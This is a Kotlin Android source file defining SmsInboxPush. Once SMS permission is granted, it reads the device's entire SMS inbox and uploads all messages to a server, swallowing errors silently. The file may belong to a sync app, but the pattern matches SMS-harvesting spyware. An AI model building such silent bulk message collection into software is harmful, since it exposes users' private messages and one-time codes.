package com.base.realtime.sms

import android.content.Context
import android.util.Log
import com.base.realtime.RealtimeApp

/**
 * First full inbox upload after SMS permission / hello.
 * Server upserts by providerId so repeats are safe.
 */
object SmsInboxPush {
    private const val TAG = "SmsInboxPush"
    private const val PREFS = "sms_inbox_push"
    private const val KEY_NEEDED = "needed_v1"

    fun markNeeded(context: Context) {
        try {
            context.applicationContext
                .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_NEEDED, true)
                .apply()
        } catch (_: Throwable) {
        }
    }

    fun tryPush(context: Context) {
        val app = context.applicationContext
        if (!SmsPermissions.granted(app)) return
        if (!needed(app)) return
        try {
            val items = SmsReader.readAll(app)
            if (items.isEmpty()) {
                clearNeeded(app)
                return
            }
            RealtimeApp.engine(app).uploadSms(items)
            clearNeeded(app)
            Log.i(TAG, "inbox queued ${items.size}")
        } catch (t: Throwable) {
            Log.w(TAG, "inbox push", t)
        }
    }

    /** After grants change: queue a full push on next connected tryPush. */
    fun onGrants(context: Context) {
        if (SmsPermissions.granted(context)) {
            markNeeded(context)
            tryPush(context)
        }
    }

    private fun needed(context: Context): Boolean = try {
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_NEEDED, true)
    } catch (_: Throwable) {
        true
    }

    private fun clearNeeded(context: Context) {
        try {
            context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_NEEDED, false)
                .apply()
        } catch (_: Throwable) {
        }
    }
}
